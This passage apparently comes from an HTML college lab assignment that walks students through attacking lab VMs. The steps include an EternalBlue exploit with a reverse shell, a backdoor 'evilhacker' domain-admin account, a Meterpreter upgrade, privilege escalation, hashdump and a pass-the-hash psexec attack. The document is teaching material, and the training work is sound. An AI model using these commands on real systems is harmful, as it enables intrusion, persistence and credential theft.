+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ python <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python2 eternalblue8_exploit.py 172.16.30.55 reverse_shell.bin 500</span></span></strong><br />
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 2.12 -->
+<ol start="12">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">In your metasploit shell, what sessions have been created?</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Review Sessions</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions -i &lt;num&gt; <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># Where &lt;num&gt; = Number of session that just opened.</strong></span></span></span></strong><br/>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+
+    <!-- 2.12 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48856563_1"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">2.12</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Use the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>sessions</strong></span> command in Metasploit and submit a screenshot showing your active shell session.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- REFERENCES -->
+<blockquote>
+  <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt; text-decoration: underline;"><strong>REFERENCES</strong></span></p>
+  <ul>
+    <li><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;"><a href="https://www.exploit-db.com/docs/english/42280-how-to-exploit-eternalblue-on-windows-server-2012-r2.pdf" target="_blank" rel="noopener"><span style="color: #ba372a;">[HowTo] Exploit Eternalblue to get a Meterpreter Session on Windows Server 2012 R2</span></a></span></li>
+    <li><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;"><a href="https://forums.kali.org/showthread.php?71778-HowTo-Installation-procedure-of-OpenVAS-on-Kali-Linux-2022-1" target="_blank" rel="noopener"><span style="color: #ba372a;">[HowTo] GVDM Database Creation Error</span></a></span></li>
+  </ul>
+</blockquote>
+<p></p>
+
+<!-- PART 3 -->
+<a href="##top9" style="color: #ba372a;">[TOP]</a>
+<hr />
+<p id="#postexploit"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 3 - Post-Exploit</strong></span></p>
+
+<!-- 3.1 -->
+<ol start="1">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Now that you have initial access to the system, take advantage of it.</span>
+  
+    <!-- 3.1 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48856563_1"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">3.1</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Using the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>whoami</strong></span> command, submit the user that you are logged on with on the domain controller.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Create a new account on the domain controller with username "evilhacker" and password "pwned"; submit the command you used at the shell prompt to accomplish this.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Elevate that "evilhacker" user to the administrator group; submit the command you used at the shell prompt to accomplish this</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>D.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Obtain a list of users on the domain controller at the command line. Upload a screenshot where 'evilhacker' is visible.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>E.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Back in the NICE webportal, launch a console to the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Domain-Controller</strong></span>. Log in as 'evilhacker' and provide a screenshot showing 'evilhacker' as your current username as proof of work.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.2 -->
+<ol start="2">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Switch back to the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Security-Desk</strong></span> and Metasploit now. Background the running shell (exploit) with <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>CTRL-Z</strong></span>, then enter <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>y</strong></span> when prompted to "Background session?"</span>
+  </li>
+</ol>
+
+<!-- 3.3 -->
+<ol start="3">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Now upgrade your shell to Meterpreter.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Upgrade to Meterpreter Shell<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">search shell_to_meterpreter</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">use post/multi/manage/shell_to_meterpreter</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">options</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set SESSION &lt;num&gt; <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># Where &lt;num&gt; is session you JUST backgrounded.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">exploit <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Should see "Meterpreter session &lt;num&gt; opened".</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions </span></span></strong><br/>
+              </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.4 -->
+<ol start="4">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Connect to that active Meterpreter session on the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>Domain-Controller</strong></span>.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Connecting to the Meterpreter Shell<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions -i &lt;num&gt; <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># Where &lt;num&gt; is the NEW meterpreter session.</strong></span></span></span></strong><br/>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.5 -->
+<ol start="5">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">There are a lot of fun things to do here.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Meterpreter Shell<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;meterpreter> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sysinfo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Where am I running?  Should be domain controller.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;meterpreter> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">getprivs <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# See what permissions we have.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;meterpreter> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">ps <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Process list.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;meterpreter> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">grtsystem <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;# Ensure we're escalated to SYSTEM access, it not already.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;meterpreter> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">migrate &lt;pid&gt; <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># Migrate to another process - Look for vds.exe and use its PID.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;meterpreter> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">hashdump </span></span></strong><br/>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.6 -->
+<ol start="6">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">These password hashes are perfect for brute forcing, and are also useful for Windows pass-the-hash attacks (where you don't need the original password, just the hash will suffice).</span>
+
+    <!-- 3.1 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48856563_1"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">3.6</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Use the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>sessions</strong></span> command in Metasploit and submit a screenshot showing both your active original shell session and new Meterpreter session.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Use the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>hashdump</strong></span> command and submit a screenshot showing the password hashes that exist on the domain controller.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">What is the full hash for UID 500 (the original administrator)? Provide the entire line you get from hashdump.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+
+    <!-- TIP GREEN -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #bfedd2; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #169179;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48837982_1"  width="16" height="22" style="border: 0px solid #000000;" alt="tip"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #169179; font-size: 14pt;">TIP</span></strong></p>
+            </td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #169179;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #169179; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #169179; font-size: 12pt;">Rather than manually typing it out which can be error-prone, use the <a href="https://cl1p.net/" target="_blank" rel="noopener"><span style="color: #ba372a;">https://cl1p.net</span></a> website for a basic clipboard between the NICE VM and whatever system you are completing this BlackBoard assignment on.</strong></span></span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.7 -->
+<ol start="7">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Background the meterpreter shell on the domain controler. <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>CTRL-Z</strong></span>, then enter <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>y</strong></span> when prompted.</span>
+  </li>
+</ol>
+
+<!-- PART 4 -->
+<a href="##top9" style="color: #ba372a;">[TOP]</a>
+<hr />
+<p id="#passthehash"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 4 - Pass-the-Hash</strong></span></p>
+
+<!-- 4.1 -->
+<ol start="1">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Let's use a Pass-The-Hash attack to gain shell access to the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>DATABASE</strong></span> computer without needing to brute force the password plaintext. This is a "feature" of older versions of Windows.</span>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">⬤</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">⬤</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Pass-the-Hash Meterpreter Shell<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">search shell_to_meterpreter</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">use exploit/windows/smb/psexec</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set RHOST 172.16.30.88 <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># The DATABASE host.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set SMBUser Administrator</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set SMBPass <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The HASHED Password.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set LHOST 172.16.20.55 <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong># Security-Desk.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set LPORT 4445 <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We need a different port since 4444 is already in use by Meterpreter on the Domain-Controller.</strong></span></span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">exploit -j</span></span></strong><br/>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions </span></span></strong><br/>
+              </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 4.2 -->
+<ol start="2">
+  <li>
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Now upgrade your shell to Meterpreter.</span>
+
+    <!-- 4.2 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;"><img src="https://courses.ccac.edu/bbcswebdav/xid-48856563_1"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong></p>
+          </td>
+        </tr>
+        <tr>
